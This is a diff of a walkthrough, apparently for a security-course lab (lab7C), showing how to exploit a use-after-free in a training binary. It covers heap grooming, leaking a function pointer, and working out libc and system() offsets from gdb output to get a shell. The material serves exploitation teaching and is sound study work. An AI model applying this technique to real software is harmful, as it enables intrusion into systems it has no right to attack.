@@ -379,34 +379,17 @@ Looking at the layout again brought me the potential answer to this literally af
 
 As we want to leak memory, we need to call a function taking as argument a piece of memory that happens to store a pointer.
 
-The goal is to see both possible states of the memory combined and find such a combination of values that will let us achieve our goal:
+The goal is to see both possible states of the memory combined and find such a combination of values that will let us achieve our goal. Let's look at the layout again, this time focusing on two particular neighboring double word values we would like to have in one state - and then think if we can groom the memory into that state:
+[want_these_two_together.png]
 
-Let's look at the layout again, this time focusing on two particular neighboring double words:
+When the space is occupied by a number structure, the <base>+0x20 address contains a pointer (the print function, marked red), while <base>+0x24 contains data (the number, in this case 0x41414141, but that's irrelevant to our goal, thus marked grey).
 
+Conversely, when the space is occupied by a data structure, the <base>+0x20 address contains data (the last three bytes of the string and its terminating nullbyte - useless to us, hence marked gray), while <base>+0x24 contains a pointer (the print function, marked red).
 
-When the space is occupied by a number structure, the <base>+0x20 address contains a pointer (the print function), while <base>+0x24 contains data (the number).
-
-Conversely, when the space is occupied by a data structure, the <base>+0x20 address contains data (the last three bytes of the string and its terminating nullbyte), while <base>+0x24 contains a pointer (the print function).
-
-So, what would happen if we allocated a string first (to propagate <base>+0x24 with the function pointer) and then simply requested the program to print a number (without creating it)? Yup it should print the data strcture printing function pointer as number.
-
-The program won't, however, allow us to do it this simple, because of the following condition:
-
-        /* print a number */
-        else if(choice == 6)
-        {
-            printf("Number index to print: ");
-            index = get_unum();
-
-            if(index < MAX_NUM && numbers[index])
-                numbers[index]->print(numbers[index]->num);
-            else
-                printf("There is no number to print!\n");
-        }
-
-The pointer 'numbers[index]' must not be empty (must not be 0). Make no mistake here. NOT the value pointer by the pointer, but the pointer itself. It needs to point at the heap (initially it is 0, as per the initialization here on line 61:     struct number * numbers[MAX_NUM] = {0};).
+We want to trick the program to create that state, so we can call the big_num/small_num number-printing function, with the address of the string-printing function sitting in the space previously occupied by an irrelevant number before it was free()d and then allocated again (but not entirely overwritten!) for the string structure.
 
 So, we create a number, then we remove it (so the number[index] is not 0, even though the structure it was pointing at was 'removed', which means free()'d).
+
 Then we create a relatively short (less than 15-characters) string, to avoid fgets() overwriting the last four bytes of the buff[20], because that is where the print number pointer is held and we will want to call it, so it prints out the address of the string print function for us, thus giving us the info needed for crafting the exploit.
 
 Let's try this without debugging too much (just check if the result is correct after performing the actions, using the breakpoint in the main loop):
@@ -496,13 +479,165 @@ gdb-peda$ x/i 0xb7744bc7
    
 Yup. It's the small_str() function.
 
+OK, once again, in slow motion (now we'll show step-by-step how the data on the heap changes).
+
+First, we allocate a number (1):
+---------------------------------------------
+Enter Choice: 2
+Input number to store: 1
+Created new number!
+
+Now, this is the heap:
+gdb-peda$ x/100wx 0xb84f3000
+0xb84f3000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb84f3010:     0x00000000      0x00000000      0x00000000      0x00000000
+0xb84f3020:     0xb779dc65      0x00000001      0x00000000      0x00020fd9
+
+[heap_1.png]
+
+Now, we remove the number:
+
+---------------------------------------------
+Enter Choice: 4
+Deleted most recent number!
+
+And again, this is the heap (yes, everything is till there after free():
+
+[heap_1.png]
+
+Now, we make a string up to 16 characters:
+
+---------------------------------------------
+Enter Choice: 1
+Input string to store: fuck
+Created new string!
+
+Now, this is the heap:
+
+gdb-peda$ x/100wx 0xb84f3000
+0xb84f3000:     0x00000000      0x00000029      0x00000000      0x00000000
+0xb84f3010:     0x6b637566      0x00000000      0x00000000      0x00000000
+0xb84f3020:     0xb779dc65      0xb779dbc7      0x00000000      0x00020fd9
+
+[heap_2.png]
+
+Now, requesting the program to print the number[1] will make it call 0xb779dc65 (big_num) with 0xb779dbc7 as argument, so we have our leak.
+
 Awesome. It looks like we have all the bits and pieces to develop an exploit :D
 
+Breakpoint 1, 0xb77b2dee in main ()
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7615190 <__libc_system>
+gdb-peda$ p printf
+$2 = {<text variable, no debug info>} 0xb7622280 <__printf>
 
 
+Calculations:
+
+0xb77b2000 0xb77b4000 r-xp      /levels/lab07/lab7C
+0xb77b4000 0xb77b5000 r--p      /levels/lab07/lab7C
+0xb77b5000 0xb77b6000 rw-p      /levels/lab07/lab7C
 
 
+gdb-peda$ searchmem 0xb7622280 0xb77b4000 0xb77b5000
+Searching for '0xb7622280' in range: 0xb77b4000 - 0xb77b5000
+Found 1 results, display max 1 items:
+lab7C : 0xb77b4fa4 --> 0xb7622280 (<__printf>:  push   ebx)
 
+This time (as opposed to lab6A walkthrough here) our entry is at 0xfa4 offset in rodata. This is probably because of the '-z relro' gcc compilation flag.
+That's OK.
+
+First, we'll leak the code base. Then we'll leak the printf() address. Then we'll calculate system's address. Then get a shell.
+
+Ah, one more thing. In order to properly leak the libc base, first we have to exploit our use after free the same way we plan to when doing arbitrary code exec (arbitrary function with an arbitrary value provided as an argument). We need to find a proper gadget for this...
+
+I guess printf("%d",pointer); will do the trick. The problem is that our UAF supports ONE argument...
+
+OK, let's try once again whether we have to the second leak at all. Maybe the libc is always loaded at a particular relative offset to the program segments (code, rodata, data):
+
+One run:
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0xb75bf000 0xb75c0000 rw-p      mapped
+0xb75c0000 0xb7768000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7768000 0xb776a000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb776a000 0xb776b000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb776b000 0xb776e000 rw-p      mapped
+0xb7774000 0xb7778000 rw-p      mapped
+0xb7778000 0xb7779000 r-xp      [vdso]
+0xb7779000 0xb777b000 r--p      [vvar]
+0xb777b000 0xb779b000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb779b000 0xb779c000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb779c000 0xb779d000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xb779d000 0xb779f000 r-xp      /levels/lab07/lab7C
+0xb779f000 0xb77a0000 r--p      /levels/lab07/lab7C
+0xb77a0000 0xb77a1000 rw-p      /levels/lab07/lab7C
+0xb84f3000 0xb8514000 rw-p      [heap]
+0xbf7fc000 0xbf81d000 rw-p      [stack]
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7600190 <__libc_system>
+
+Another run:
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0xb756d000 0xb756e000 rw-p      mapped
+0xb756e000 0xb7716000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7716000 0xb7718000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7718000 0xb7719000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7719000 0xb771c000 rw-p      mapped
+0xb7724000 0xb7726000 rw-p      mapped
+0xb7726000 0xb7727000 r-xp      [vdso]
+0xb7727000 0xb7729000 r--p      [vvar]
+0xb7729000 0xb7749000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb7749000 0xb774a000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb774a000 0xb774b000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xb774b000 0xb774d000 r-xp      /levels/lab07/lab7C
+0xb774d000 0xb774e000 r--p      /levels/lab07/lab7C
+0xb774e000 0xb774f000 rw-p      /levels/lab07/lab7C
+0xbfb41000 0xbfb62000 rw-p      [stack]
+
+Yup, in both cases the offets are the same:
+
+gdb-peda$ p 0xb774b000-0xb756e000
+$1 = 0x1dd000
+gdb-peda$ p 0xb779d000-0xb75c0000
+$2 = 0x1dd000
+
+Hence, one leak is enough here (which might not be the case for the stack of the heaps, but we don't care about this here):
+
+gdb-peda$ p system
+$3 = {<text variable, no debug info>} 0xb75ae190 <__libc_system>
+
+system's() offset within the libc() segment (as opposed to calculating the difference from the relative printf() offset):
+
+gdb-peda$ p 0xb75ae190-0xb756e000
+$4 = 0x40190
+
+
+Another run:
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0xb75db000 0xb75dc000 rw-p      mapped
+0xb75dc000 0xb7784000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7784000 0xb7786000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7786000 0xb7787000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7787000 0xb778a000 rw-p      mapped
+0xb7792000 0xb7794000 rw-p      mapped
+0xb7794000 0xb7795000 r-xp      [vdso]
+0xb7795000 0xb7797000 r--p      [vvar]
+0xb7797000 0xb77b7000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb77b7000 0xb77b8000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb77b8000 0xb77b9000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xb77b9000 0xb77bb000 r-xp      /levels/lab07/lab7C
+0xb77bb000 0xb77bc000 r--p      /levels/lab07/lab7C
+0xb77bc000 0xb77bd000 rw-p      /levels/lab07/lab7C
+0xbfd16000 0xbfd37000 rw-p      [stack]
+gdb-peda$ p 0xb761c190-0xb75dc000
+$2 = 0x40190
+
+Yup. It's the same :D
 
 
 
